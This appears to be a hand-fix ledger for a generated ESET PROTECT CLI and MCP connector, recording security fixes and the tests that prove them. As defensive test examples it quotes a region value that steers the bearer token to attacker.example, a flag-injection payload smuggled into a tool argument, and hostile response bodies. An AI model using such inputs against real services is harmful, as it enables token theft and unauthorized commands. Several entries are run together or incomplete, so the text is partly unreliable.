_comment: Connector-specific edits a cli-printing-press reprint must NOT clobber. check_handfixes.py asserts every marker below is still present (and every banned anti-pattern still absent) and fails CI if a reprint dropped one. Schema and rationale: docs/reprint-survival.md. Regen steps: cli-factory/fortinet/regen.sh.

handfixes.summary: the Windows token-file guard compares trustees by SID, resolving SDDL aliases through the OS, so the built-in Administrator (RID 500, rendered as LA) can save and load credentials
handfixes.why: Press 4.30.2+ creds_perms_eval.go compared the SDDL text of the token file's owner and ACE trustees against the process's SID string. The SDDL converter renders the built-in local Administrator (RID 500) as the alias LA, so that account's own ACE never matched: `auth set-token` exited 1 with `token file DACL grants access to a non-owner principal (LA)` and every read refused the file. Reproduced 2026-10-15 on the published fortinet-cli 0.1.0, installed with the README one-liner on a windows-latest runner (whoami S-1-5-21-...-500). The fix resolves each trustee to its SID (fixed aliases from a table, machine-relative ones like LA through ConvertStringSidToSid, kept only when the converter renders that SID back to the same alias) and compares SIDs. The allow-list is unchanged (current user, BUILTIN\Administrators, SYSTEM): an owner or allow-ACE trustee that is any other principal, a broad group, or unresolvable is still refused. A reprint from an unfixed press silently restores the string compare while unit tests stay green on every non-Windows host.

handfixes.summary: the Windows token-file guard checks the DACL section's framing, so a NULL DACL is refused in the form Windows actually renders it, flags first (D:PAINO_ACCESS_CONTROL), and DACL text that does not frame as flags plus complete six-field ACEs is refused rather than skipped
handfixes.why: Press creds_perms_eval.go refused a NULL DACL only when the DACL section began with NO_ACCESS_CONTROL. SDDL puts DACL flags (P, AI, AR) first, and a real NULL DACL on Windows Server 2025 renders as O:<owner>D:PAINO_ACCESS_CONTROL (measured on a windows-latest runner, 2026-10-15), so the guard found no ACEs to inspect and accepted a world-accessible token file. That was already a hole for every ordinary account; for the built-in Administrator the owner-alias mismatch happened to refuse it, so resolving LA (windows-sddl-alias-sid-compare) without this fix would have widened the hole. The DACL section's framing is now checked: its flags must be drawn from P/AI/AR/NO_ACCESS_CONTROL, an empty DACL followed by a SACL section ends at that section, and the ACE list must be complete, un-nested (...) groups of exactly six fields. Unknown flags, an unclosed or nested group, stray text, or a wrong field count is refused (fail-closed). ACE flags and rights are not validated; they do not change which principal an allow ACE names.
handfixes.spec_encode_followup: Same press templates as windows-sddl-alias-sid-compare; reported in the same upstream issue: https://github.com/mvanhorn/cli-printing-press/issues/5029

handfixes.why: requireHTTPCallerToken read ESET_PROTECT_MCP_HTTP_TOKEN with os.Getenv. handfixes.summary: an env-sourced ESET_PROTECT_BASE_URL is marked as an env override in config.Load and configForSave writes the file's own value back, so config.toml never captures the override
handfixes.why: config.Load applied ESET_PROTECT_BASE_URL without markEnvOverride, so the first token save (every password-grant mint persists the token) wrote the override into config.toml. Unsetting the variable then changed nothing, and because the credential host pin trusts the configured base URL host, the cached bearer kept going to that host on every later run. Ported from skills/bitdefender. TestEnvBaseURLNeverPersisted failed before the fix (`env base URL persisted to config.toml`).

handfixes.summary: doctor names the ESET password grant on the Auth row, reports a rejected token mint as an Auth and Credentials failure while still probing reachability, and verifies the token with one real authenticated read (GET device-management /v1/device_groups?pageSize=1) instead of 'present, not verified'; the API row is an ERROR naming ESET_PROTECT_BASE_URL when that probe answers HTTP 404 or an HTML page (wrong base URL), and an INFO row naming ESET_PROTECT_REGION and ESET_PROTECT_BASE_URL when neither the region nor a base URL override was set (the default eu region was used; the credential probe still runs)
handfixes.why: The generated doctor only saw a credential once an Authorization header was stamped; ESET mints it inside the client hook. With ESET_PROTECT_USERNAME + ESET_PROTECT_PASSWORD set it printed `FAIL Auth: not configured`, turned a rejected mint into `API: client init error`, and with a VALID password still said `Auth: not configured` and never checked the token. TestDoctorVerdictTracksReality (fake token endpoint + fake device-management, no live ESET call) failed before the fix in all four credentialed cases. Exit codes unchanged: doctor exits 0 by default, `doctor --fail-on error` exits 1 on the new ERROR rows. check_doctor_truth.py then still failed on two states: wrong-base (the stub serves HTML at / and 404 everywhere else) reported `api: reachable (HTML body at /)`, and placeholder (no base URL, no region) reported `api: reachable (HTTP 404 at /)` without naming ESET_PROTECT_BASE_URL. ESET's region legitimately defaults to eu, so the row does not claim a placeholder: esetDoctorRegionVerdict (one call in doctor.go) makes it `WARN ESET_PROTECT_REGION is not set, so the default eu region was used; set ESET_PROTECT_REGION to eu, de, us, ca or jpn to match the tenant, or ESET_PROTECT_BASE_URL for a custom endpoint (...)`, keeping an unreachable or wrong-base verdict at its own severity with the same remedy appended. esetDoctorProbeCredentials maps a 404 or HTML answer to `api: ERROR wrong base URL: <base> answered GET /v1/device_groups with HTTP 404 ...; unset ESET_PROTECT_BASE_URL (and base_url in the config file) or point it at https://<region>.device-management.eset.systems` and `credentials: ERROR not verified: ...`. TestDoctorVerdictTracksReality's new wrong-base cases failed with the 404/HTML branches removed (`api = "reachable (HTTP 404 at /)", want prefix "ERROR wrong base URL"`) and TestDoctorDefaultRegionIsAWarning (ESET answered by a local round-tripper, no live call) failed with the doctor.go call removed (`api = "reachable (HTTP 404 at /)", want it to contain "WARN "`); check_doctor_truth.py --slug eset-protect passes all four states. Round 3: the default-region note is an INFO row, not a WARN, so `doctor --fail-on warn` passes on the documented eu default (doctor-fail-on-matches-rows); TestDoctorDefaultRegionIsAWarning is now TestDoctorDefaultRegionIsInfo.

handfixes.summary: every variable the binaries read (username, password, region, token, base URL, user agent, MCP read-only switch, MCP HTTP token, client profile) is declared identically in manifest.json, server.json and every mcp-install.md env block; optional values are blank, never a placeholder

handfixes.summary: client.do() runs every API response body through RedactCredentialFields, which replaces v1Device.deviceToken (at any depth) with "[redacted]", so it never reaches CLI or MCP output, the local SQLite mirror, its FTS index or the response cache
handfixes.why: ESET device-management returns deviceToken (spec: "Identity token for the device", readOnly) on every device object from GET /v1/devices, /v1/devices/{uuid}, /v1/devices:batchGet, /v1/device_groups/{uuid}/devices and the :batchImport response. Measured on the pre-fix binary against a local mock serving a sentinel token: `sync --resources devices,device-groups` wrote it into the mirror database and 7 of 8 device commands printed it (devices list live/local, devices get, devices-batch-get, device-groups devices groups-list-member, devices-batch-import; devices profile did not). One funnel, right after the body is read and inflated (a transport-level rewrite would miss gzip bodies, which the client inflates itself): every generated command, sync, write-through cache, novel command and eset-protect_execute inherits it. Rule: replace the value with "[redacted]" (key kept, so the row shape is unchanged); null/empty left alone; a body that carries no credential is returned byte for byte. Proven failing-without at three levels: TestClientRedactsDeviceTokenAtDecode, TestDeviceTokenNeverStoredOrPrinted (sync into a temp --home, grep every file's bytes, then every command above) and TestCodeOrchExecuteRedactsDeviceToken; also re-proven on the built binaries (zero sentinel hits in --home and in outputs; MCP stdio execute/search/sql redacted). Round 3 (Codex P1): the redactor used Decoder.More() as an end-of-input check, so a body such as `{}]{"deviceToken":"SECRET"}` read as one value and came back unchanged, and an unterminated value escaped the regex fallback. It now shares cliutil.RedactJSONKeys (credential-redaction-fails-closed): a body is redacted only after it parsed as exactly one JSON value (second Decode returns io.EOF), every key occurrence including duplicates is checked, and a body that is not one JSON value and names deviceToken in any encoding (plain, \u or %XX escaped, any case) is withheld: client.do returns an error naming CredentialBodyWithheld on success and shows the marker in an API error, before the HTML summary can quote any of it. TestRedactCredentialFields failed with the withhold removed (`codex concatenation: a body that cannot be redacted was returned`); TestRedactCredentialFieldsPropertyNeverReturnsTheToken and TestClientFunnelsNeverReturnOrCacheTheToken (credvariants corpus through client.do with the cache on) failed with it too (`an error carried the token`). Round 5: the error-path funnel no longer skips declared binary requests; see error-bodies-always-redacted. Round 6: the redacted body then goes through the secret registry (secret-registry-masks-every-boundary) and the withheld text names its cause (withheld-body-names-its-cause).

handfixes.summary: the ESET transport refuses any request that carries an Authorization header to a host other than <region>.<service>.eset.systems or the configured base URL host, so no URL-rewriting flag can steer the bearer token off ESET
handfixes.why: Every ESET path is an absolute https://{region}.<service>.eset.systems template and --path-context substitutes {region} after the region check, so `sync --path-context region=attacker.example/` (also reachable from MCP) turned the service host into attacker.example and the client stamped the bearer token on it. esetHostAllower (eset_auth.go) pins credentialed requests to ESET service hosts plus the explicitly configured base URL host; EsetTransport.RoundTrip (eset_transport.go) refuses before sending; the hook and auth login both install it. TestSyncPathContextCannotSteerBearerToken drives the real sync with a recorder under the transport: with AllowHost removed it failed (`the bearer token was sent to the steered host: "attacker.example Bearer test-token"`); TestEsetTransportPinsCredentialsToEsetHosts covers look-alike hosts and ports. Round 3: --path-context region= is now normalized and validated first (region-normalized-and-validated), so TestSyncPathContextCannotSteerBearerToken sees the steered value refused as a region before any request; the pin itself stays and is unit-tested by TestEsetTransportPinsCredentialsToEsetHosts.

handfixes.summary: the ESET Connect token request never follows a redirect (CheckRedirect returns http.ErrUseLastResponse)
handfixes.why: The password grant POSTs the API user's email and password (and the refresh grant the refresh token) as a form body. A 307/308 from the token endpoint, or from anything that answers in its place, would replay that body to whatever host it names. TestEsetTokenMintDoesNotFollowRedirects failed with the CheckRedirect line removed (`the password was replayed to the redirect target`).

handfixes.summary: Recipe intent handlers (internal/mcp/intents.go) build argv for the companion CLI outside cliArgsFromMCP. appendRecipeStringFlag always emits one --name=value element, and the isolate_a_machine positional first runs rejectFlagLikeRecipeValue, which refuses a value beginning with '-' (except the bare '-') before the CLI runs. (1 guarded call site; the ledger requires all of them.)
handfixes.why: The press 4.33.5 recipe tool isolate_a_machine appends its `slug` tool-call argument as a positional to `respond isolate`, a WRITE path (with --yes it sends StartNetworkIsolation), with no flag-like check, so {"slug": "--deliver=webhook:https://x/"} (or "--yes") was parsed by pflag as a flag. Proven both directions: with the guard removed TestRecipeIntentIsolateAMachineRejectsFlagLikePositional failed (recorder showed `respond isolate --deliver=webhook:https://x/`) and passes with it; on the built binaries over MCP stdio, tools/call isolate_a_machine {"slug":"--deliver=webhook:http://127.0.0.1:<port>/"} returned `flag-like value ... not allowed for slug` and the local listener received nothing. Same defect and fix as skills/connectsecure, skills/acronis and skills/avanan. A reprint REINTRODUCES it while go build and go test stay green; this entry is what notices. Retire only when the press generator refuses flag-like recipe positionals itself.

handfixes.why: `gitleaks detect --no-git --source skills/eset-protect` (8.18.4, default rules) flagged internal/cliutil/jwtshape_test.go:17 as generic-api-key (`realAuth0RS256 := "eyJhbGciOiJSUzI1NiIs..."`). handfixes.why: The press-generated MCPB manifest keeps the -pp- binary name after strip-pp-cli renames cmd/eset-protect-pp-mcp to cmd/eset-protect-mcp, so the .mcpb would point at a file the archive does not contain (same leak fixed on atera and bitdefender). handfixes.summary: esetClientHook arms ResponseHeaderTimeout (the client's own timeout) on the base *http.Transport before wrapping it in EsetTransport, so a binary download on client.StreamingHTTPClient cannot hang forever waiting for headers
handfixes.why: StreamingHTTPClient (generated client.go, used for quarantined-objects download and batch-download) drops the whole-call Timeout so large bodies can finish and re-arms ResponseHeaderTimeout only when the client's transport is a bare *http.Transport. The ESET hook wraps it in EsetTransport, so the streaming client kept no header deadline at all: a server that accepts the connection and never answers hung the command indefinitely, worse than an unwrapped connector. esetArmHeaderTimeout clones the base transport with ResponseHeaderTimeout = ConfiguredTimeout before wrapping; ordinary requests are already bounded by the same whole-call Timeout, so only the streaming path changes. TestStreamingDownloadHeaderStallTimesOut drives a quarantine download (POST with the binary header) against a server that never sends a status line, with --timeout 300ms: with the arming line reverted it failed (`a quarantine download whose server never sends headers hung past 20s; --timeout 300ms must bound the header wait`), with it the call fails in 0.3s.

handfixes.summary: `auth login` exits non-zero when the token mints but the probe read (GET device-management /v1/device_groups) fails: 4 when ESET answers 401/403, 5 for any other failure; --json gains probe_ok
handfixes.why: auth login minted the token, ran one probe read, and on failure printed `token minted, but the probe call failed: ...` and returned nil, so it exited 0 for an API user without device-management access (401/403), an outage, or a base URL that is not the ESET API, and `auth login && sync` carried on. handfixes.summary: NamesKeyInAnyEncoding decodes \u and %XX escapes for at most maxEscapeDecodePasses (16) linear passes and checks the key after every pass; a body still unwinding at the budget reports true, so client.do withholds it whole; DecodeEscapesToFixedPoint returns ok false at the budget
handfixes.why: Codex round 5 (P2): decoding escapes of a body that is not JSON ran to a fixed point with no budget, and a hostile body loses only two bytes per pass ("%" then 500,000 "25" pairs is ~1 MB, ~500,000 allocations and ~250 GB scanned), a CPU loop that ignores the request deadline, in CLI and MCP. Bounded at 16 passes (real responses nest two or three levels), so work and allocations are linear; a body still changing at the budget is refused (withheld), the fail-closed direction. The key is now also checked before the first pass and after each one, so a literal key that a later pass would consume ("%6deviceToken=..." decodes to "meviceToken") is no longer missed. TestEscapeDecodingIsBounded pins the ceiling in the test (16, independent of the constant), measures allocations (at most 4*(16+2)+8) and bytes allocated (at most 8*(16+2)*len+1 MiB) at 50 KB and 400 KB for four bomb families, and runs the review's 1 MB body under a 10 s deadline; TestEscapeDecodingBudgetVerdicts: every bomb refused, a key nested up to the budget found, the same nesting without the key allowed, the consumed-literal cases found; TestEscapeBombBodiesAreWithheld: the 1 MB body is withheld on the success and error paths of client.do within 5 s. Every earlier sentinel test still passes. handfixes.summary: one process-wide, concurrency-safe registry (internal/secrets) holds every credential the process reads or mints: ESET_PROTECT_PASSWORD, ESET_PROTECT_TOKEN and ESET_PROTECT_MCP_HTTP_TOKEN (at start and on every EnvOverride read), every credential field of the config and credentials files (on load and SaveTokens) and credential-named custom headers, the password and refresh token each token request submits, every access and refresh token the token service returns (success or not), every bearer the 401 re-mint publishes (EsetTransport.SetAuth) and the client's request credential. One function, secrets.Mask, replaces each (8 characters or more) with [redacted], ASCII case-insensitively, raw and in four JSON-escaped, URL query and path and HTML-escaped forms, and withholds the whole text when a registered value is still spelled in any other way (per-character, mixed or nested encodings). It runs on token-service errors (only known OAuth2/ESET error codes are shown, error_description is masked before it is cut), API error bodies (masked before truncation) and success bodies (before the cache and mirror), HTML summaries (from the masked page), every doctor row (its verdict kept), every MCP tool result and error (the outermost middleware), --deliver payloads, and line by line in the CLI stdout/stderr writer, which Execute flushes
handfixes.why: Codex round 6 (P1 x2, after secrets in error text in several consecutive rounds): (1) esetRequestToken put the token service's error and error_description into every error unmasked, so {"error":"invalid_grant","error_description":"Rejected password SECRET"} showed the password in CLI errors, doctor rows and MCP results; (2) a 401 re-mint published the new bearer only on the transport, while client.maskCredentialText masked only the original config and request credential, so a later HTTP 403 echoing the refreshed token T2 showed it. Closed as a class with one mechanism instead of two patches: register every secret where it is read or minted, mask with one function at every boundary text leaves the process, and keep the stdout/stderr writer as the last line for any path missed. The masker is fail-closed by construction: in-place masking for the fixed forms, then, per registered value, a check of the ORIGINAL text with only that value's own matches cut out, using a per-character speller (each character raw or in any encoding, two levels deep) at every depth of whole-text decoding; a value still spelled, or text still decoding after 16 passes, withholds the whole text. The property tests found three holes in earlier drafts, all closed: an HTML title is stripped and cut by the summary (now summarized from the masked page); masking a registered value inside a half-encoded occurrence of another hid the evidence (hence the per-value cut); a secret holding escape-like text ("%3E", "&LT") or a space and a plus was broken by whole-text decoding (hence the speller). Decisions: base64 is not matched (no credential is ever sent base64-encoded, so a server can only echo the forms it received, and the only base64 the CLI prints is a binary download's envelope, which must stay exact); values shorter than 8 characters are ignored so ordinary words are never masked; a withheld writer unit falls back to line by line so only the lines holding an encoded credential are withheld. Tests: TestMaskNeverLeaksARegisteredSecret (2100 random mixed-alphabet, non-ASCII and JWT-shaped secrets x 17 spellings x 4 contexts, oracle credvariants.SecretRecoverable written apart from the masker and catching 10-byte partial runs), TestMaskingOneSecretNeverHidesAnother, TestRegisteredSecretsNeverLeaveTheAPIClient (JSON, text and HTML error bodies on a JSON endpoint and a declared binary download, a body cut across the 4096-byte error-text limit, success JSON and HTML pages), TestTokenServiceErrorsNeverShowASecret, TestTokenErrorShowsOnlyKnownOAuthCodes, TestMintedTokensAreRegistered, TestSetAuthRegistersTheRefreshedBearer, TestDoctorNeverShowsASecret, TestDoctorMaskKeepsTheRowVerdict, TestTerminalWriterMasksRegisteredSecrets (random cut points), TestDeliverMasksTextPayloads, TestMCPToolResultsNeverCarryASecret (execute error and success bodies, isolate_a_machine, a cobratree mirror, sql, search and a tool returning a Go error, all through server dispatch), TestMaskToolResultCoversEveryContentKind, TestCredentialEnvIsRegisteredWhenRead, TestLoadedCredentialsAreRegistered, TestConfigFileCredentialsAreRegistered, TestSavedTokensAreRegistered and TestBuiltBinariesNeverShowASecret (both Codex scenarios on binaries built with -ldflags -X for the token URL, the CLI and the MCP server over stdio; on a git archive of 5590ed87d it fails with `Rejected password pw-...` and `Rejected credential tok02-...`). handfixes.summary: when ESET answers 401 and the transport's re-mint fails, the transport returns the re-mint's error instead of the 401: a credential rejection exits 4, a token-service outage (no answer, 5xx, 429) is a TokenUnavailableError (exit 5, and an auto read falls back to the mirror saying why), anything else exits 5; neither is retried

handfixes.summary: every MCP tool result's text is escaped like the CLI writer before it leaves the server: U+0080-U+009F and the bidi controls U+202A-U+202E and U+2066-U+2069 become \uXXXX, so execute, sql and search (in-process, JSON text) stay valid and lossless and no raw C1 or bidi control reaches the host
handfixes.why: Adversarial round 6 (P2): eset-protect_execute, sql and search answer in-process through encoding/json only, which escapes C0, U+2028 and U+2029 but leaves C1 (CSI 0x9b, NEL 0x85) and U+202E raw, so a hostile device name reached the MCP host with them, in normal and read-only mode (the cobratree mirror shells out to the escaped CLI and was clean). The outermost MCP middleware (eset_secret_mask.go) runs escapeTerminalRunes on every text content, bytes that are not UTF-8 copied as they are. handfixes.summary: a response body that is not one JSON value is withheld with a message that names the actual cause: CredentialBodyWithheld when it names deviceToken in some encoding, UndecodableBodyWithheld when it names nothing but its escapes were still unwinding at the 16-pass budget

handfixes.summary: AtomicWritePrivateFile gives the temporary file a protected owner-only DACL on Windows before writing any secret, and SaveCredentials deletes a credentials file that still fails VerifyCredsPerms
handfixes.why: Chmod does not restrict NTFS ACLs, so with ESET_PROTECT_HOME under a directory granting Users read access, credentials.toml (live access and refresh tokens) inherited that access; VerifyCredsPerms then returned an error but left the file, and the token-mint path ignored the save failure (Codex round 4 P1). restrictPrivateFile (private_acl_windows.go) applies D:P(A;;FA;;;<current user>) with PROTECTED_DACL_SECURITY_INFORMATION, the same SetNamedSecurityInfo pattern the generated Windows test sandbox uses; off Windows it is a no-op. TestPrivateFileDACLBeforeWrite (Windows-only, runs on the Windows CI row) uses an Everyone-readable inheritable directory: a plain os.WriteFile control fails VerifyCredsPerms, the AtomicWritePrivateFile file passes. Not runnable on the macOS dev host; GOOS=windows go vet and go test -c pass. Adversarial round 3 found the generated TestSaveCredentialsVerifiesWrittenFile Windows branch still expected the old refuse-and-keep behavior (it would have failed the Windows CI row); it now asserts SaveCredentials succeeds under a Users-readable inherited directory and the saved file passes VerifyCredsPerms, a second Windows-CI proof of this fix. Residual (accepted P2): os.CreateTemp creates the file with the inherited DACL a moment before restrictPrivateFile runs, so a local reader racing that window could hold a handle; closing it fully needs CreateFile with SECURITY_ATTRIBUTES.
